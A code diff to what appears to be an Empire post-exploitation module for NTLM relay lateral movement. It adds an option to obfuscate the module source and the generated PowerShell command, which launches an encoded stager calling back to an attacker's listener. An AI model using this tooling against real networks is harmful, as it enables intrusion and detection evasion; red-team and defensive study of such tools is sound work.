@@ -143,7 +143,7 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
 
         listenerName = self.options['Listener']['Value']
         userAgent = self.options['UserAgent']['Value']
@@ -153,7 +153,9 @@ class Module:
 
         # read in the common module source code
         moduleSource = self.mainMenu.installPath + "/data/module_source/lateral_movement/Invoke-InveighRelay.ps1"
-
+        if obfuscate:
+            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
+            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
         try:
             f = open(moduleSource, 'r')
         except:
@@ -176,19 +178,21 @@ class Module:
                 # generate the PowerShell one-liner with all of the proper options set
                 command = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
         # set defaults for Empire
-        script += "\n" + 'Invoke-InveighRelay -Tool "2" -Command \"%s\"' % (command)
+        scriptEnd = "\n" + 'Invoke-InveighRelay -Tool "2" -Command \"%s\"' % (command)
 
 	for option,values in self.options.iteritems():
             if option.lower() != "agent" and option.lower() != "listener" and option.lower() != "useragent" and option.lower() != "proxy_" and option.lower() != "proxycreds" and option.lower() != "command":
                 if values['Value'] and values['Value'] != '':
                     if values['Value'].lower() == "true":
                         # if we're just adding a switch
-                        script += " -" + str(option)
+                        scriptEnd += " -" + str(option)
                     else:
                         if "," in str(values['Value']):
                             quoted = '"' + str(values['Value']).replace(',', '","') + '"'
-                            script += " -" + str(option) + " " + quoted
+                            scriptEnd += " -" + str(option) + " " + quoted
                         else:
-                            script += " -" + str(option) + " \"" + str(values['Value']) + "\""
-
+                            scriptEnd += " -" + str(option) + " \"" + str(values['Value']) + "\""
+        if obfuscate:
+            scriptEnd = helpers.obfuscate(psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
+        script += scriptEnd
         return script
